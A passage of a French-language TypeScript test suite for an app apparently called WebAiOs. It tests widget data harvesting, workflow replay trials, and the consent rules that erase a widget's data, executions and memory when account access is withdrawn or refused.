  it("accord refusé pendant la récolte, après la lecture avec compte : rien n'est écrit, accord-requis", async () => {
    const ctx = await preparer(
      "daily",
      `export default async (w) => { const p = await w.lirePage("https://app.daily.dev/", { compte: true }); await w.kev("x", {}); return p.texte; };`,
      sources,
    );
    await ecrireDonnees(ctx.dossierWidgets, "daily", { ancien: true });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    // Ce que fait refuserAccord : accord retiré, données effacées.
    const faux = {
      kev: async () => {
        await retirerAccord(ctx.dossierWidgets, "daily");
        await supprimerDonnees(ctx.dossierWidgets, "daily");
        return {};
      },
      gemma: async () => "",
    };
    const r = await recolter(ctx, { pont, ia: faux });
    expect(appelsLecture(pont)).toHaveLength(1);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreurNoyau: true });
    expect(r.donnees).toBeUndefined();
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).statut).toBe("accord-requis");
    const accueil = await lireAccueil(cheminsEspace(ctx.espace), ctx.dossierWidgets);
    const lu = accueil.widgets.find((w) => w.id === "daily")!;
    expect("donnees" in lu && lu.donnees).toBeNull(); // ce que donnees_widget rendrait
  });
});

describe("executerRecolte, par le workflow du widget", () => {
  const sources = { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] };
  const donneesDe = (ctx: Contexte) => join(ctx.dossierWidgets, ctx.widget.id);
  const executionDe = async (ctx: Contexte, id: string | undefined) => {
    expect(id).toBeTruthy();
    return (await lireExecution(donneesDe(ctx), id!))!;
  };
  /** Remplace recolte.mjs par un workflow.json (et ses fichiers). */
  async function enWorkflow(ctx: Contexte, workflow: unknown, fichiers: Record<string, string> = {}) {
    await rm(join(ctx.widget.dossier, "recolte.mjs"), { force: true });
    await writeFile(join(ctx.widget.dossier, "workflow.json"), typeof workflow === "string" ? workflow : JSON.stringify(workflow));
    for (const [nom, texte] of Object.entries(fichiers)) await writeFile(join(ctx.widget.dossier, nom), texte);
  }
  const NOUVEAUX = {
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "id" } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
    ],
    liens: [{ de: "liste", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
  };
  /** Une exécution ancienne et une mémoire, pour vérifier qu'elles partent avec les données. */
  async function traces(ctx: Contexte) {
    const ancienne: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", proprietaire: { type: "widget", id: ctx.widget.id }, declencheur: "planifiee",
      debut: "2026-10-27T08:00:00.000Z", fin: "2026-10-27T08:00:01.000Z", statut: "reussie", blocs: [],
    };
    await ecrireExecution(donneesDe(ctx), ancienne);
    await ecrireMemoire(donneesDe(ctx), { nouveaux: { type: "liste.nouveaux", valeur: ["secret"] } });
  }

  it("un widget avec seulement recolte.mjs et un compte tourne comme avant : mêmes données, même journal, exécution implicite recolte → sortie", async () => {
    const ctx = await preparer(
      "gmail",
      `export default async (w) => {
        const p = await w.lirePage("https://app.daily.dev/", { compte: true });
        w.journal("courriels lus");
        return { texte: p.texte, prec: w.precedent, cfg: w.config, quand: w.maintenant };
      };`,
      sources,
    );
    await ecrireDonnees(ctx.dossierWidgets, "gmail", { ancien: true });
    await accorder(ctx.dossierWidgets, "gmail", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    const attendu = { texte: "articles", prec: { ancien: true }, cfg: { a: 1 }, quand: MAINTENANT.toISOString() };
    expect(r.etat).toMatchObject({ statut: "ok", derniereMaj: MAINTENANT.toISOString() });
    expect(r.donnees).toEqual(attendu);
    expect(await lireJson(join(ctx.dossierWidgets, "gmail", "donnees.json"))).toEqual(attendu);
    const etat = await lireEtatWidget(ctx.dossierWidgets, "gmail");
    expect(etat.statut).toBe("ok");
    expect(etat.journal).toContain("courriels lus");
    expect(appelsLecture(pont)[0]!.args).toEqual(["https://app.daily.dev/", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true }]);
    const e = await executionDe(ctx, r.execution);
    expect(e).toMatchObject({ statut: "reussie", declencheur: "planifiee", proprietaire: { type: "widget", id: "gmail" }, debut: MAINTENANT.toISOString() });
    expect(e.blocs.map((b) => [b.id, b.type, b.statut])).toEqual([["recolte", "code", "reussi"], ["sortie", "sortie", "reussi"]]);
    expect(e.blocs[0]!.journal).toContain("courriels lus");
    // Une erreur levée par ce widget reste la sienne : jamais marquée du noyau.
    await writeFile(join(ctx.widget.dossier, "recolte.mjs"), `export default async () => { throw new Error("Délai dépassé"); };`);
    const echec = await recolter(ctx);
    expect(echec.etat).toMatchObject({ statut: "erreur", erreur: "Délai dépassé" });
    expect(echec.etat.erreurNoyau).toBeUndefined();
    expect(await lireJson(join(ctx.dossierWidgets, "gmail", "donnees.json"))).toEqual(attendu);
    expect((await executionDe(ctx, echec.execution)).statut).toBe("echouee");
  });

  it("un widget en workflow écrit données, exécution et mémoire ; la récolte suivante reçoit la mémoire", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const r1 = await recolter(ctx);
    expect(r1.etat.statut).toBe("ok");
    expect(r1.donnees).toEqual([{ id: 1 }, { id: 2 }]);
    expect(await lireJson(join(ctx.dossierWidgets, "flux", "donnees.json"))).toEqual([{ id: 1 }, { id: 2 }]);
    expect((await lireMemoire(donneesDe(ctx))).nouveaux?.type).toBe("liste.nouveaux");
    const e = await executionDe(ctx, r1.execution);
    expect(e.blocs.map((b) => [b.id, b.statut, b.elements])).toEqual([["liste", "reussi", 2], ["nouveaux", "reussi", 2], ["sortie", "reussi", 2]]);
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => [{ id: 2 }, { id: 3 }];`);
    const r2 = await recolter(ctx);
    expect(r2.donnees).toEqual([{ id: 3 }]);
  });

  it("la mémoire d'une exécution s'écrit sous le verrou de la mémoire du widget (celui de l'effacement du constructeur)", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    let liberer!: () => void;
    const tenu = avecMemoire(donneesDe(ctx), () => new Promise<void>((r) => (liberer = r)));
    let finie = false;
    const r = recolter(ctx).then((x) => ((finie = true), x));
    const donnees = join(donneesDe(ctx), "donnees.json");
    for (let i = 0; i < 200 && !existsSync(donnees); i++) await new Promise((t) => setTimeout(t, 25));
    expect(existsSync(donnees)).toBe(true);
    await new Promise((t) => setTimeout(t, 100));
    expect(finie).toBe(false);
    expect(existsSync(join(donneesDe(ctx), "memoire.json"))).toBe(false);
    liberer();
    await tenu;
    expect((await r).etat.statut).toBe("ok");
    expect((await lireMemoire(donneesDe(ctx))).nouveaux?.type).toBe("liste.nouveaux");
  });

  it("un workflow.json invalide : état erreur « Workflow invalide : … » marqué erreurNoyau, données gardées, aucun conteneur lancé, exécution échouée écrite", async () => {
    for (const workflow of ['{"version":1,"blocs":[', { version: 1, blocs: [{ id: "x", type: "inconnu" }] }]) {
      const ctx = await preparer("casse", "");
      await enWorkflow(ctx, workflow);
      await ecrireDonnees(ctx.dossierWidgets, "casse", { ancien: true });
      const r = await recolter(ctx);
      expect(r.etat.statut).toBe("erreur");
      expect(r.etat.erreur).toMatch(/^Workflow invalide : /);
      expect(r.etat.erreurNoyau).toBe(true);
      expect(erreurDuNoyau(r.etat.erreur!)).toBe(true);
      expect(ctx.commandes).toHaveLength(0);
      expect(await lireJson(join(ctx.dossierWidgets, "casse", "donnees.json"))).toEqual({ ancien: true });
      const e = await executionDe(ctx, r.execution);
      expect(e).toMatchObject({ statut: "echouee", erreurNoyau: true, blocs: [] });
      expect(e.erreur).toBe(r.etat.erreur);
    }
  });

  it("le workflow est validé selon le widget : budgetSecondes 600 refusé sans durée maximale, accepté avec dureeMaxMinutes 30", async () => {
    const LONG = {
      version: 1,
      blocs: [
        { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
        { id: "page", type: "source.page", parametres: { url: "https://app.daily.dev/", parElement: true, budgetSecondes: 600 } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "liste", vers: "page" }, { de: "page", vers: "sortie" }],
    };
    const fichiers = { "liste.mjs": "export default () => [{ id: 1 }];" };
    const court = await preparer("court", "");
    await enWorkflow(court, LONG, fichiers);
    const refuse = await recolter(court, { pont: pontLecture() });
    expect(refuse.etat.erreur).toBe("Workflow invalide : page.budgetSecondes : 170 au plus");
    expect(court.commandes).toHaveLength(0);

    const long = await preparer("long", "");
    long.widget.declaration.recolte = { minutes: 60, dureeMaxMinutes: 30 };
    await enWorkflow(long, LONG, fichiers);
    const r = await recolter(long, { pont: pontLecture() });
    expect(long.commandes).toHaveLength(1);
    expect(r.etat.statut).toBe("ok");
  });

  it("accord retiré pendant l'exécution : ni données, ni exécution, ni mémoire sur le disque à la fin", async () => {
    const ctx = await preparer("daily", "", sources);
    await enWorkflow(ctx, NOUVEAUX, {
      "liste.mjs": `export default async (e, w) => [{ id: (await w.lirePage("https://app.daily.dev/", { compte: true })).texte }];`,
    });
    await ecrireDonnees(ctx.dossierWidgets, "daily", { ancien: true });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const lire = pont.lirePageInvisible!.bind(pont);
    // Ce que fait refuserAccord, pendant la lecture : la page lue arrive quand même au widget.
    pont.lirePageInvisible = async (...a: Parameters<typeof lire>) => {
      await retirerAccord(ctx.dossierWidgets, "daily");
      await supprimerDonnees(ctx.dossierWidgets, "daily");
      return lire(...a);
    };
    const r = await recolter(ctx, { pont });
    expect(appelsLecture(pont)).toHaveLength(1);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreurNoyau: true });
    expect(r.donnees).toBeUndefined();
    expect(r.execution).toBeUndefined();
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.dossierWidgets, "daily", "memoire.json"))).toBe(false);
    expect(await listerExecutions(donneesDe(ctx))).toEqual([]);
    expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).statut).toBe("accord-requis");
  });

  it("profil refusé : données, exécutions et mémoire effacées", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await traces(ctx);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    const r = await recolter(ctx, { pont: pontLecture(["prive"]) });
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreur: PROFIL_REFUSE, erreurNoyau: true });
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.dossierWidgets, "daily", "memoire.json"))).toBe(false);
    expect(await listerExecutions(donneesDe(ctx))).toEqual([]);
  });

  it("accord périmé (déclaration changée) : exécutions et mémoire effacées avec les données", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await traces(ctx);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev", "ancien.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("accord-requis");
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.dossierWidgets, "daily", "memoire.json"))).toBe(false);
    // Seule reste l'exécution « accord requis » de cette fois.
    expect((await listerExecutions(donneesDe(ctx))).map((e) => [e.id, e.statut])).toEqual([[r.execution, "accord-requis"]]);
  });

  it("sans accord : exécution accord-requis, sans bloc lancé", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const r = await recolter(ctx);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev", erreurNoyau: true });
    expect(ctx.commandes).toHaveLength(0);
    const e = await executionDe(ctx, r.execution);
    expect(e).toMatchObject({ statut: "accord-requis", erreurNoyau: true, erreur: r.etat.erreur });
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "pas-lance"], ["sortie", "pas-lance"]]);
  });

  it("sans accord, encore : pas de nouvelle exécution accord-requis, la dernière tient lieu", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const premiere = await recolter(ctx);
    // Une heure plus tard : sans la règle, une seconde exécution (autre id) serait écrite.
    const plusTard = () => new Date(MAINTENANT.getTime() + 3_600_000);
    const seconde = await executerRecolte({ ...optionsDe(ctx), horloge: plusTard });
    expect(seconde.etat.statut).toBe("accord-requis");
    expect(seconde.execution).toBe(premiere.execution);
    expect((await listerExecutions(donneesDe(ctx))).map((e) => e.statut)).toEqual(["accord-requis"]);
  });

  it("l'exécution porte le déclencheur demandé", async () => {
    const ctx = await preparer("meteo", `export default async () => 1;`);
    const r = await executerRecolte({ ...optionsDe(ctx), declencheur: "agent" });
    expect((await executionDe(ctx, r.execution)).declencheur).toBe("agent");
    const m = await executerRecolte({ ...optionsDe(ctx), declencheur: "manuelle" });
    expect((await executionDe(ctx, m.execution)).declencheur).toBe("manuelle");
  });

  it("interrompue à la fin : exécution interrompue", async () => {
    const ctx = await preparer("lent", `export default () => new Promise(() => {});`);
    const r = await executerRecolte({ ...optionsDe(ctx), delaiMs: 300, interrompue: () => true });
    const e = await executionDe(ctx, r.execution);
    // Le message est celui du noyau (pas « Délai dépassé ») ; le bloc commencé est interrompu, la sortie jamais lancée.
    expect(e).toMatchObject({ statut: "interrompue", erreur: "Interrompue : WebAiOs s'est arrêté", erreurNoyau: true });
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "interrompu"], ["sortie", "pas-lance"]]);
    expect(erreurDuNoyau(e.erreur!)).toBe(true);
  });
});

describe("executerEssai", () => {
  const sources = { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] };
  const donneesDe = (ctx: Contexte) => join(ctx.dossierWidgets, ctx.widget.id);
  async function enWorkflow(ctx: Contexte, workflow: unknown, fichiers: Record<string, string> = {}) {
    await rm(join(ctx.widget.dossier, "recolte.mjs"), { force: true });
    await writeFile(join(ctx.widget.dossier, "workflow.json"), JSON.stringify(workflow));
    for (const [nom, texte] of Object.entries(fichiers)) await writeFile(join(ctx.widget.dossier, nom), texte);
  }
  const NOUVEAUX = {
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "id" } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
    ],
    liens: [{ de: "liste", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
  };
  /** Contenu et date de modification des fichiers gardés hors de l'espace (absent : null). */
  const instantane = async (ctx: Contexte) => {
    const r: Record<string, { texte: string; mtime: number } | null> = {};
    for (const nom of ["donnees.json", "memoire.json", "etat.json"]) {
      const chemin = join(donneesDe(ctx), nom);
      r[nom] = existsSync(chemin) ? { texte: await readFile(chemin, "utf8"), mtime: (await stat(chemin)).mtimeMs } : null;
    }
    return r;
  };
  const essai = (ctx: Contexte, origine: string, depart: string, o: Partial<Parameters<typeof executerEssai>[0]> = {}) =>
    executerEssai({ ...optionsDe(ctx), origine, depart, ...o });

  it("un essai écrit une exécution -essai avec depart et origine, et ne touche ni données, ni mémoire, ni état", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const reel = await executerRecolte(optionsDe(ctx));
    expect(reel.etat.statut).toBe("ok");
    expect((await lireMemoire(donneesDe(ctx))).nouveaux).toBeDefined();
    const avant = await instantane(ctx);
    expect(Object.values(avant).every((f) => f !== null)).toBe(true);
    // La liste n'est pas relancée : sa sortie est reprise de l'exécution d'origine.
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const traces: unknown[] = [];
    const r = await essai(ctx, reel.execution!, "nouveaux", { surTrace: (t) => traces.push(t) });
    expect(r).toEqual({ ok: true, execution: idEssai(MAINTENANT.toISOString()), statut: "reussie" });
    const e = (await lireExecution(donneesDe(ctx), (r as { execution: string }).execution))!;
    expect(e).toMatchObject({ declencheur: "rejeu", essai: { depart: "nouveaux", origine: reel.execution }, statut: "reussie" });
    expect(e.blocs.map((b) => [b.id, b.statut, b.elements])).toEqual([["liste", "repris", 2], ["nouveaux", "reussi", 2], ["sortie", "reussi", 2]]);
    expect(traces).toEqual([
      { bloc: "nouveaux", etape: "debut" },
      { bloc: "nouveaux", etape: "fin", statut: "reussi", elements: 2 },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: 2 },
    ]);
    expect(await instantane(ctx)).toEqual(avant);
    // La vraie exécution est toujours là, à côté de l'essai.
    expect((await listerExecutions(donneesDe(ctx))).map((x) => x.id).sort()).toEqual([reel.execution, e.id].sort());
  });

  it("rejouer deux fois depuis le même bloc : le second essai part du premier et reprend les sorties de la vraie exécution", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const reel = await executerRecolte(optionsDe(ctx));
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const premier = await essai(ctx, reel.execution!, "nouveaux");
    if (!premier.ok) throw new Error(premier.erreur);
    const plusTard = new Date(MAINTENANT.getTime() + 60_000);
    const second = await essai(ctx, premier.execution, "nouveaux", { horloge: () => plusTard });
    expect(second).toEqual({ ok: true, execution: idEssai(plusTard.toISOString()), statut: "reussie" });
    const e = (await lireExecution(donneesDe(ctx), idEssai(plusTard.toISOString())))!;
    // L'origine nommée est celle d'où vient la sortie reprise : la vraie exécution.
    expect(e.essai).toEqual({ depart: "nouveaux", origine: reel.execution });
    expect(e.blocs.map((b) => [b.id, b.statut, b.elements])).toEqual([["liste", "repris", 2], ["nouveaux", "reussi", 2], ["sortie", "reussi", 2]]);
    // Vraie exécution élaguée : le refus reste celui d'une sortie manquante.
    await rm(join(donneesDe(ctx), "executions", `${reel.execution}.json`));
    expect(await essai(ctx, premier.execution, "nouveaux", { horloge: () => new Date(plusTard.getTime() + 60_000) })).toEqual({
      ok: false, erreur: "Rejeu impossible : la sortie de « liste » manque dans cette exécution",
    });
  });

  it("un essai en échec n'écrit aucune erreur dans l'état du widget", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    const reel = await executerRecolte(optionsDe(ctx));
    const avant = await instantane(ctx);
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => { throw new Error("boum"); };`);
    const r = await essai(ctx, reel.execution!, "liste");
    expect(r).toMatchObject({ ok: true, statut: "echouee" });
    expect(await instantane(ctx)).toEqual(avant);
    const etat = await lireEtatWidget(ctx.dossierWidgets, "flux");
    expect(etat.statut).toBe("ok");
    expect(etat.erreur).toBeUndefined();
  });

  it("essai d'un widget avec compte sans accord : refusé avec le message d'accord, aucun conteneur, rien d'écrit", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const r = await essai(ctx, "2026-10-27T08-00-00-000Z", "recolte");
    expect(r).toEqual({ ok: false, erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(ctx.commandes).toHaveLength(0);
    expect(existsSync(donneesDe(ctx))).toBe(false);
  });

  it("accord retiré pendant l'essai : aucune exécution sur le disque", async () => {
    const ctx = await preparer(
      "daily",
      `export default async (w) => { const p = await w.lirePage("https://app.daily.dev/", { compte: true }); await w.kev("x", {}); return p.texte; };`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const faux = { kev: async () => ({}), gemma: async () => "" };
    const reel = await executerRecolte({ ...optionsDe(ctx), ia: faux });
    expect(reel.etat.statut).toBe("ok");
    // Ce que fait refuserAccord, pendant l'essai.
    const retirer = {
      kev: async () => {
        await retirerAccord(ctx.dossierWidgets, "daily");
        await supprimerDonnees(ctx.dossierWidgets, "daily");
        return {};
      },
      gemma: async () => "",
    };
    const r = await essai(ctx, reel.execution!, "recolte", { ia: retirer });
    expect(r).toEqual({ ok: false, erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(await listerExecutions(donneesDe(ctx))).toEqual([]);
    expect(existsSync(join(donneesDe(ctx), "donnees.json"))).toBe(false);
  });

  it("essai refusé par le plan de rejeu : message exact, aucun conteneur lancé", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    const reel = await executerRecolte(optionsDe(ctx));
    const lances = ctx.commandes.length;
    const avant = await instantane(ctx);
    expect(await essai(ctx, reel.execution!, "absent")).toEqual({ ok: false, erreur: "Rejeu impossible : le bloc « absent » n'est pas dans le workflow" });
    expect(await essai(ctx, "2020-01-01T00-00-00-000Z", "liste")).toEqual({ ok: false, erreur: "Rejeu impossible : exécution introuvable" });
    expect(ctx.commandes).toHaveLength(lances);
    expect(await instantane(ctx)).toEqual(avant);
    expect(await listerExecutions(donneesDe(ctx))).toHaveLength(1);
  });

  it("essai dont les sorties reprises et le précédent dépassent 4 Mo : refusé, aucun conteneur, rien d'écrit", async () => {
    const ctx = await preparer("gros", "");
    const amont = Array.from({ length: 10 }, (_, i) => `a${i}`);
    await enWorkflow(ctx, {
      version: 1,
      blocs: [
        ...amont.map((id) => ({ id, type: "code", parametres: { source: "a.mjs" } })),
        { id: "tout", type: "code", parametres: { source: "a.mjs" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [...amont.map((de) => ({ de, vers: "tout" })), { de: "tout", vers: "sortie" }],
    }, { "a.mjs": `export default async () => 1;` });
    await ecrireDonnees(ctx.dossierWidgets, "gros", "x".repeat(1_900_000));
    const origine: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", proprietaire: { type: "widget", id: "gros" }, declencheur: "planifiee",
      debut: "2026-10-27T08:00:00.000Z", fin: "2026-10-27T08:00:01.000Z", statut: "reussie",
      blocs: amont.map((id) => ({ id, type: "code", statut: "reussi" as const, debut: null, fin: null, elements: null, sortie: "y".repeat(240_000), journal: [] })),
    };
    await ecrireExecution(donneesDe(ctx), origine);
    const r = await essai(ctx, origine.id, "tout");
    expect(r).toEqual({ ok: false, erreur: "Rejeu impossible : les sorties à reprendre dépassent 4 Mo" });
    expect(ctx.commandes).toHaveLength(0);
    expect((await listerExecutions(donneesDe(ctx))).map((e) => e.id)).toEqual([origine.id]);
  });

  it("un widget sans workflow.json (recolte.mjs seul) : rejouer depuis sortie reprend la sortie de recolte", async () => {
    const ctx = await preparer("gmail", `export default async (w) => ({ texte: (await w.lirePage("https://app.daily.dev/", { compte: true })).texte });`, sources);
    await accorder(ctx.dossierWidgets, "gmail", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const reel = await executerRecolte({ ...optionsDe(ctx), pont });
    expect(reel.etat.statut).toBe("ok");
    const avant = await instantane(ctx);
    await writeFile(join(ctx.widget.dossier, "recolte.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const r = await essai(ctx, reel.execution!, "sortie", { pont });
    expect(r).toMatchObject({ ok: true, statut: "reussie" });
    const e = (await lireExecution(donneesDe(ctx), (r as { execution: string }).execution))!;
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "repris"], ["sortie", "reussi"]]);
    expect(appelsLecture(pont)).toHaveLength(1);
    expect(await instantane(ctx)).toEqual(avant);
    expect(existsSync(join(ctx.widget.dossier, "workflow.json"))).toBe(false);
  });

  it("accord périmé au départ d'un essai : accord retiré, données effacées, état accord-requis signalé, aucun conteneur", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    const etat = { statut: "ok" as const, derniereMaj: "2026-10-27T08:00:00.000Z", derniereTentative: "2026-10-27T08:00:00.000Z" };
    await ecrireEtatWidget(ctx.dossierWidgets, "daily", etat);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev", "ancien.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const surChange = vi.fn();
    const r = await essai(ctx, "2026-10-27T08-00-00-000Z", "recolte", { surChange });
    expect(r).toEqual({ ok: false, erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(ctx.commandes).toHaveLength(0);
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(donneesDe(ctx), "donnees.json"))).toBe(false);
    expect(await lireEtatWidget(ctx.dossierWidgets, "daily")).toEqual({
      ...etat,
      statut: "accord-requis",
      erreur: "Accord requis pour lire avec ton compte : app.daily.dev",
      erreurNoyau: true,
    });
    expect(surChange).toHaveBeenCalled();
  });

  it("profil refusé pendant l'essai : aucune exécution, accord retiré, état accord-requis", async () => {
    const ctx = await preparer("daily", `export default async (w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;`, sources);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const reel = await executerRecolte(optionsDe(ctx));
    expect(reel.etat.statut).toBe("ok");
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    const surChange = vi.fn();
    const r = await essai(ctx, reel.execution!, "recolte", { pont: pontLecture(["prive"]), surChange });
    expect(r).toEqual({ ok: false, erreur: PROFIL_REFUSE });
    expect(await listerExecutions(donneesDe(ctx))).toEqual([]);
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(donneesDe(ctx), "donnees.json"))).toBe(false);
    expect(await lireEtatWidget(ctx.dossierWidgets, "daily")).toMatchObject({
      statut: "accord-requis",
      erreur: PROFIL_REFUSE,
      erreurNoyau: true,
      derniereMaj: reel.etat.derniereMaj,
      derniereTentative: reel.etat.derniereTentative,
    });
    expect(surChange).toHaveBeenCalled();
  });

  it("interrompu pendant l'essai : exécution -essai interrompue, ni données, ni mémoire, ni état touchés", async () => {
    const ctx = await preparer("lent", `export default () => new Promise(() => {});`);
    await ecrireDonnees(ctx.dossierWidgets, "lent", { ancien: true });
    await ecrireEtatWidget(ctx.dossierWidgets, "lent", { statut: "ok", derniereMaj: "2026-10-27T08:00:00.000Z", derniereTentative: "2026-10-27T08:00:00.000Z" });
    const origine: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", proprietaire: { type: "widget", id: "lent" }, declencheur: "planifiee",
      debut: "2026-10-27T08:00:00.000Z", fin: "2026-10-27T08:00:01.000Z", statut: "reussie", blocs: [],
    };
    await ecrireExecution(donneesDe(ctx), origine);
    const avant = await instantane(ctx);
    const r = await essai(ctx, origine.id, "recolte", { delaiMs: 300, interrompue: () => true });
    expect(r).toEqual({ ok: true, execution: idEssai(MAINTENANT.toISOString()), statut: "interrompue" });
    const e = (await lireExecution(donneesDe(ctx), idEssai(MAINTENANT.toISOString())))!;
    expect(e).toMatchObject({ statut: "interrompue", erreur: "Interrompue : WebAiOs s'est arrêté", erreurNoyau: true });
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "interrompu"], ["sortie", "pas-lance"]]);
    expect(await instantane(ctx)).toEqual(avant);
  });

  it("sans accord : un essai plus récent n'empêche pas la dernière exécution accord-requis de tenir lieu", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const premiere = await executerRecolte(optionsDe(ctx));
    expect(premiere.etat.statut).toBe("accord-requis");
    const essaiEcrit: Execution = {
      version: 1, id: "2026-10-28T11-00-00-000Z-essai", proprietaire: { type: "widget", id: "daily" }, declencheur: "rejeu",
      essai: { depart: "recolte", origine: premiere.execution! },
      debut: "2026-10-28T11:00:00.000Z", fin: "2026-10-28T11:00:01.000Z", statut: "echouee", blocs: [],
    };
    await ecrireExecution(donneesDe(ctx), essaiEcrit);
    const plusTard = () => new Date(MAINTENANT.getTime() + 2 * 3_600_000);
    const seconde = await executerRecolte({ ...optionsDe(ctx), horloge: plusTard });
    expect(seconde.execution).toBe(premiere.execution);
    expect((await listerExecutions(donneesDe(ctx))).filter((e) => !e.essai)).toHaveLength(1);
  });
});

describe("executerRecolte, veille (publications au fil de l'eau, mémoire gardée, nouveautés)", () => {
  const donneesDe = (ctx: Contexte) => join(ctx.dossierWidgets, ctx.widget.id);
  const fichierDonnees = (ctx: Contexte) => join(donneesDe(ctx), "donnees.json");
  const fichierMemoire = (ctx: Contexte) => join(donneesDe(ctx), "memoire.json");
  /** liste (code) → fiche (source.recuperer par élément) → sortie. */
  const veille = (o: { auFilDeLEau?: boolean } = {}) => ({
